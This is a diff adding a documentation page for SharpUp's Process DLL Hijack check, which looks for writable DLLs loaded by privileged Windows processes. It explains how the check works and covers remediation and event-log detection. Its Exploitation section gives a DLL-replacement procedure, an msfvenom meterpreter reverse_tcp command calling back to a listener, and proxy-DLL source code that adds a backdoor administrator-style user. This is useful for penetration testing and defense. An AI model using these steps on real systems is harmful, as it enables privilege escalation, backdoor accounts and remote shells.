@@ -1,0 +1,143 @@
+---
+title: 'Process DLL Hijack'
+description: 'Writable DLLs loaded by privileged processes'
+icon: 'file-code'
+---
+
+## Overview
+
+The Process DLL Hijack check identifies DLL files loaded by running processes that have weak file permissions. If a DLL used by a privileged process can be modified, an attacker can inject malicious code that executes with the process's privileges.
+
+<Warning>
+This check excludes known DLLs (registered in the KnownDLLs registry key) and system32 DLLs which are typically protected.
+</Warning>
+
+## How It Works
+
+SharpUp performs the following:
+
+1. Reads known DLLs from `HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDlls`
+2. Enumerates all running processes
+3. For each process, enumerates loaded DLL modules
+4. Excludes DLLs in `C:\Windows` directory
+5. Excludes KnownDLLs
+6. Checks if remaining DLLs are writable
+7. Reports hijackable DLLs with associated process information
+
+## Example Output
+
+```
+[+] Hijackable DLL: C:\Program Files\CustomApp\helper.dll
+[+] Associated Process is CustomApp with PID 1234
+
+[+] Potentially Hijackable DLL: C:\Program Files\AnotherApp\utils.dll
+[!] Files in C:\Program Files and C:\Program Files (x86) may be false positives. Permissions should be verified manually.
+[+] Associated Process is AnotherApp with PID 5678
+```
+
+## Exploitation
+
+### Method 1: Direct DLL Replacement
+
+```powershell
+# Backup original DLL
+$dllPath = "C:\Program Files\CustomApp\helper.dll"
+Copy-Item $dllPath "$dllPath.bak"
+
+# Create malicious DLL
+# (Use msfvenom or custom DLL)
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o malicious.dll
+
+# Replace DLL
+Copy-Item C:\temp\malicious.dll $dllPath -Force
+
+# Wait for process restart or reboot
+```
+
+### Method 2: DLL Proxying
+
+```cpp
+// Create proxy DLL that forwards to original while executing payload
+#include <windows.h>
+
+// Forward declarations for original DLL functions
+#pragma comment(linker, "/export:OriginalFunction1=helper_original.OriginalFunction1")
+#pragma comment(linker, "/export:OriginalFunction2=helper_original.OriginalFunction2")
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // Malicious payload
+        STARTUPINFO si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        CreateProcess(NULL, "cmd.exe /c net user hacker P@ss /add", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+        // Application continues to work normally
+    }
+    return TRUE;
+}
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Identify Writable DLLs">
+    ```powershell
+    # Check DLL permissions
+    Get-Process | ForEach-Object {
+        try {
+            $_.Modules | Where-Object {
+                $_.FileName -notmatch "C:\\Windows" -and
+                (Test-Path $_.FileName)
+            } | ForEach-Object {
+                $acl = Get-Acl $_.FileName
+                $writable = $acl.Access | Where-Object {
+                    $_.IdentityReference -match "Users|Everyone" -and
+                    $_.FileSystemRights -match "Write|Modify"
+                }
+                if ($writable) {
+                    Write-Host "[!] Writable DLL: $($_.FileName)"
+                    Write-Host "    Process: $($Process.Name) (PID: $($Process.Id))"
+                }
+            }
+        } catch { }
+    }
+    ```
+  </Step>
+
+  <Step title="Fix DLL Permissions">
+    ```powershell
+    $dllPath = "C:\Program Files\CustomApp\helper.dll"
+
+    # Set secure permissions
+    icacls $dllPath /reset
+    icacls $dllPath /inheritance:r
+    icacls $dllPath /grant:r "SYSTEM:F"
+    icacls $dllPath /grant:r "Administrators:F"
+    icacls $dllPath /grant:r "Users:RX"
+    ```
+  </Step>
+</Steps>
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Monitor DLL modifications
+# Enable file system auditing on application DLL folders
+
+# Monitor Event ID 4663 for WriteData operations on DLL files
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |
+Where-Object {$_.Message -match '\.dll' -and $_.Message -match 'WriteData'}
+```
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Hijackable Paths" icon="route" href="/ghostpack-docs/SharpUp-mdx/checks/hijackablepaths">
+    Writable folders in system PATH
+  </Card>
+  <Card title="Modifiable Service Binaries" icon="file-binary" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservicebinaries">
+    Service executables with weak permissions
+  </Card>
+</CardGroup>
